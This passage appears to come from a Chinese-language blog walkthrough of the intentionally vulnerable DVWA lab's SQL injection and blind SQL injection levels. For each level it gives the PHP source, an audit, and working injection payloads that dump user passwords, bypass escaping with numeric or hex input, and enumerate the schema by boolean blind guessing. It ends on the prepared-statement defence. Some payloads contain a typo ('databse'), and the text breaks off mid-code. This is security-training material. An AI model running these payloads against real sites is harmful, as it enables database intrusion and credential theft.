<li><p>下载数据<br>输入1’ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：<br>!<img src="sqlinjection11.png" alt=""><br>users表中所有用户的user_id,first_name,last_name,password的数据</p>
</li>
</ul>
<h3 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">'id'</span> ]; </span><br><span class="line">    <span class="variable">$id</span> = mysql_real_escape_string( <span class="variable">$id</span> ); </span><br><span class="line"></span><br><span class="line">    // Check database </span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = <span class="variable">$id</span>;"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) or die( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    // Get results </span><br><span class="line">    <span class="variable">$num</span> = mysql_numrows( <span class="variable">$result</span> ); </span><br><span class="line">    <span class="variable">$i</span>   = 0; </span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$i</span> &lt; <span class="variable">$num</span> ) &#123; </span><br><span class="line">        // Display values </span><br><span class="line">        <span class="variable">$first</span> = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">"first_name"</span> ); </span><br><span class="line">        <span class="variable">$last</span>  = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;<span class="variable">$id</span>&#125;&lt;br /&gt;First name: &#123;<span class="variable">$first</span>&#125;&lt;br /&gt;Surname: &#123;<span class="variable">$last</span>&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        // Increase loop count </span><br><span class="line">        <span class="variable">$i</span>++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    //mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-15"><a href="#审计-15" class="headerlink" title="审计"></a>审计</h4><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号<br>\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入</p>
<h4 id="漏洞利用-12"><a href="#漏洞利用-12" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>虽然利用表单控制用户的输入，但是我们可以通过抓包改参数，提交我们构造的查询参数。</p>
<ul>
<li>判断是否存在注入，注入是字符型还是数字型</li>
</ul>
<p><img src="sqlinjection12.png" alt=""><br>报错:<br><img src="sqlinjection13.png" alt=""><br>抓包更改参数id为1 or 1=1 #，查询成功：<br><img src="sqlinjection14.png" alt=""></p>
<p>由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。直接绕过</p>
<p>其他操作跟low级别得到漏洞利用差不多，只不多是抓包更改参数而已。这里就不赘述了。</p>
<p>如果想要绕过单引号转义过滤，可以将字符串转为16进制编码数据或使用char函数(十进制)进行转化(因为数据库会自动把16进制转化)</p>
<h3 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_SESSION</span> [ <span class="string">'id'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_SESSION</span>[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Check database </span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = <span class="variable">$id</span> LIMIT 1;"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) or die( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    // Get results </span><br><span class="line">    <span class="variable">$num</span> = mysql_numrows( <span class="variable">$result</span> ); </span><br><span class="line">    <span class="variable">$i</span>   = 0; </span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$i</span> &lt; <span class="variable">$num</span> ) &#123; </span><br><span class="line">        // Get values </span><br><span class="line">        <span class="variable">$first</span> = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">"first_name"</span> ); </span><br><span class="line">        <span class="variable">$last</span>  = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;<span class="variable">$id</span>&#125;&lt;br /&gt;First name: &#123;<span class="variable">$first</span>&#125;&lt;br /&gt;Surname: &#123;<span class="variable">$last</span>&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        // Increase loop count </span><br><span class="line">        <span class="variable">$i</span>++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-16"><a href="#审计-16" class="headerlink" title="审计"></a>审计</h4><p>与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果</p>
<h4 id="漏洞利用-13"><a href="#漏洞利用-13" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，这里不再演示，可看low级别的漏洞利用。<br>需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入，如下如所示:</p>
<p><img src="sqlinjection16.png" alt=""><br><img src="sqlinjection17.png" alt=""></p>
<h3 id="Impossible-5"><a href="#Impossible-5" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_GET</span>[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Was a number entered? </span><br><span class="line">    <span class="keyword">if</span>(is_numeric( <span class="variable">$id</span> )) &#123; </span><br><span class="line">        // Check the database </span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> ); </span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">':id'</span>, <span class="variable">$id</span>, PDO::PARAM_INT ); </span><br><span class="line">        <span class="variable">$data</span>-&gt;execute(); </span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch(); </span><br><span class="line"></span><br><span class="line">        // Make sure only 1 result is returned </span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;rowCount() == 1 ) &#123; </span><br><span class="line">            // Get values </span><br><span class="line">            <span class="variable">$first</span> = <span class="variable">$row</span>[ <span class="string">'first_name'</span> ]; </span><br><span class="line">            <span class="variable">$last</span>  = <span class="variable">$row</span>[ <span class="string">'last_name'</span> ]; </span><br><span class="line"></span><br><span class="line">            // Feedback <span class="keyword">for</span> end user </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;<span class="variable">$id</span>&#125;&lt;br /&gt;First name: &#123;<span class="variable">$first</span>&#125;&lt;br /&gt;Surname: &#123;<span class="variable">$last</span>&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-17"><a href="#审计-17" class="headerlink" title="审计"></a>审计</h4><p>Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。</p>
<h2 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h2><p>盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p>
<h3 id="手工盲注思路"><a href="#手工盲注思路" class="headerlink" title="手工盲注思路"></a>手工盲注思路</h3><p>手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。</p>
<p>盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里由于实验环境的限制，只演示基于布尔的盲注与基于时间的盲注。</p>
<p>下面简要介绍手工盲注的步骤（可与之前的手工注入作比较）：</p>
<blockquote>
<p>1.判断是否存在注入，注入是字符型还是数字型<br>2.猜解当前数据库名<br>3.猜解数据库中的表名<br>4.猜解表中的字段名<br>5.猜解数据</p>
</blockquote>
<h3 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_GET</span>[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Check database </span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="variable">$id</span>';"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$getid</span> ); // Removed <span class="string">'or die'</span> to suppress mysql errors </span><br><span class="line"></span><br><span class="line">    // Get results </span><br><span class="line">    <span class="variable">$num</span> = @mysql_numrows( <span class="variable">$result</span> ); // The <span class="string">'@'</span> character suppresses errors </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; 0 ) &#123; </span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // User wasn<span class="string">'t found, so the page wasn'</span>t! </span><br><span class="line">        header( <span class="variable">$_SERVER</span>[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> ); </span><br><span class="line"></span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-18"><a href="#审计-18" class="headerlink" title="审计"></a>审计</h4><p>可以看到，Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种，‘</p>
<pre><code>User ID exists in the database.
</code></pre><p>‘与‘</p>
<p><code>User ID is MISSING from the database.</code></p>
<p>因此这里是SQL盲注漏洞。</p>
<h4 id="漏洞利用-14"><a href="#漏洞利用-14" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul>
<li>判断是否存在注入，注入是字符型还是数字型<br>输入1，显示相应用户存在：</li>
</ul>
<p><img src="sqlinjection21.png" alt=""></p>
<p>输入1’ and 1=1 #，显示存在：</p>
<p><img src="sqlinjection22.png" alt=""></p>
<p>输入1’ and 1=2 #，显示不存在：</p>
<p><img src="sqlinjection23.png" alt=""></p>
<ul>
<li>猜解当前数据库名</li>
</ul>
<p>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。</p>
<p>输入1’ and length(database())=1 #，显示不存在；</p>
<p>输入1’ and length(database())=2 #，显示不存在；</p>
<p>输入1’ and length(database())=3 #，显示不存在；</p>
<p>输入1’ and length(database())=4 #，显示存在：</p>
<p>说明数据库名长度为4。</p>
<p>下面采用二分法猜解数据库名。</p>
<p>输入1’ and ascii(substr(databse(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；</p>
<p>输入1’ and ascii(substr(databse(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；</p>
<p>输入1’ and ascii(substr(databse(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；</p>
<p>输入1’ and ascii(substr(databse(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；</p>
<p>输入1’ and ascii(substr(databse(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；</p>
<p>输入1’ and ascii(substr(databse(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。</p>
<p>…</p>
<p>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。<br>盲注果然费心费力。</p>
<ul>
<li>猜解数据库中的表名<br>首先猜解数据库中表的数量：</li>
</ul>
<p>1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在</p>
<p>1’ and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在</p>
<p>说明数据库中共有两个表。</p>
<p>接着挨个猜解表名：</p>
<p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在</p>
<p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在</p>
<p>…</p>
<p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在</p>
<p>说明第一个表名长度为9。</p>
<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在</p>
<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 # 显示存在</p>
<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 # 显示存在</p>
<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 # 显示不存在</p>
<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 # 显示不存在</p>
<p>说明第一个表的名字的第一个字符为小写字母g。</p>
<p>…</p>
<p>重复上述步骤，即可猜解出两个表名（guestbook、users）。</p>
<p>如果不借助工具的话，盲注是一个很大的过程。</p>
<ul>
<li>猜解表中的字段名<br>首先猜解表中字段的数量：</li>
</ul>
<p>1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 # 显示不存在</p>
<p>…</p>
<p>1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # 显示存在</p>
<p>说明users表有8个字段。</p>
<p>接着挨个猜解字段名：</p>
<p>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在</p>
<p>…</p>
<p>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 显示存在</p>
<p>说明users表的第一个字段为7个字符长度。</p>
<p>采用二分法，即可猜解出所有字段名。</p>
<ul>
<li>猜解数据<br>同样采用二分法。</li>
</ul>
<h3 id="Medium-6"><a href="#Medium-6" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">'id'</span> ]; </span><br><span class="line">    <span class="variable">$id</span> = mysql_real_escape_string( <span class="variable">$id</span> ); </span><br><span class="line"></span><br><span class="line">    // Check database </span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = <span class="variable">$id</span>;"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$getid</span> ); // Removed <span class="string">'or die'</span> to suppress mysql errors </span><br><span class="line"></span><br><span class="line">    // Get results </span><br><span class="line">    <span class="variable">$num</span> = @mysql_numrows( <span class="variable">$result</span> ); // The <span class="string">'@'</span> character suppresses errors </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; 0 ) &#123; </span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    //mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-19"><a href="#审计-19" class="headerlink" title="审计"></a>审计</h4><p>，Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p>
<p>\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入</p>
<h4 id="漏洞利用-15"><a href="#漏洞利用-15" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数id，提交恶意构造的查询参数。</p>
<p>之前已经介绍了详细的盲注流程，这里就简要演示几个。</p>
<p>首先是基于布尔的盲注：</p>
<p>抓包改参数id为1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；</p>
<p>抓包改参数id为1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；</p>
<p>抓包改参数id为1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。</p>
<h3 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">    &lt;?php </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( isset( <span class="variable">$_COOKIE</span>[ <span class="string">'id'</span> ] ) ) &#123; </span><br><span class="line">        // Get input </span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_COOKIE</span>[ <span class="string">'id'</span> ]; </span><br><span class="line">    </span><br><span class="line">        // Check database </span><br><span class="line">        <span class="variable">$getid</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="variable">$id</span>' LIMIT 1;"</span>; </span><br><span class="line">        <span class="variable">$result</span> = mysql_query( <span class="variable">$getid</span> ); // Removed <span class="string">'or die'</span> to suppress mysql errors </span><br><span class="line">    </span><br><span class="line">        // Get results </span><br><span class="line">        <span class="variable">$num</span> = @mysql_numrows( <span class="variable">$result</span> ); // The <span class="string">'@'</span> character suppresses errors </span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$num</span> &gt; 0 ) &#123; </span><br><span class="line">            // Feedback <span class="keyword">for</span> end user </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            // Might sleep a random amount </span><br><span class="line">            <span class="keyword">if</span>( rand( 0, 5 ) == 3 ) &#123; </span><br><span class="line">                sleep( rand( 2, 4 ) ); </span><br><span class="line">            &#125; </span><br><span class="line">    </span><br><span class="line">            // User wasn<span class="string">'t found, so the page wasn'</span>t! </span><br><span class="line">            header( <span class="variable">$_SERVER</span>[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> ); </span><br><span class="line">    </span><br><span class="line">            // Feedback <span class="keyword">for</span> end user </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    </span><br><span class="line">        mysql_close(); </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    ?&gt; </span><br><span class="line">``` </span><br><span class="line"><span class="comment">#### 审计</span></span><br><span class="line">High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 漏洞利用</span></span><br><span class="line">虽然添加了LIMIT 1，但是我们可以通过<span class="comment">#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们只演示基于布尔的盲注：</span></span><br><span class="line"></span><br><span class="line">抓包将cookie中参数id改为1’ and length(database())=4 <span class="comment">#，显示存在，说明数据库名的长度为4个字符；</span></span><br><span class="line"></span><br><span class="line">抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1),1))=9 <span class="comment">#，显示存在，说明数据中的第一个表名长度为9个字符；</span></span><br><span class="line"></span><br><span class="line">抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns <span class="built_in">where</span> table_name=0×7573657273)=8 <span class="comment">#，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Impossible</span></span><br><span class="line"></span><br><span class="line">``` bash</span><br><span class="line">    &lt;?php </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( isset( <span class="variable">$_GET</span>[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">        // Check Anti-CSRF token </span><br><span class="line">        checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line">    </span><br><span class="line">        // Get input </span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">'id'</span> ]; </span><br><span class="line">    </span><br><span class="line">        // Was a number entered? </span><br><span class="line">        <span class="keyword">if</span>(is_numeric( <span class="variable">$id</span> )) &#123; </span><br><span class="line">            // Check the database </span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> ); </span><br><span class="line">            <span class="variable">$data</span>-&gt;bindParam( <span class="string">':id'</span>, <span 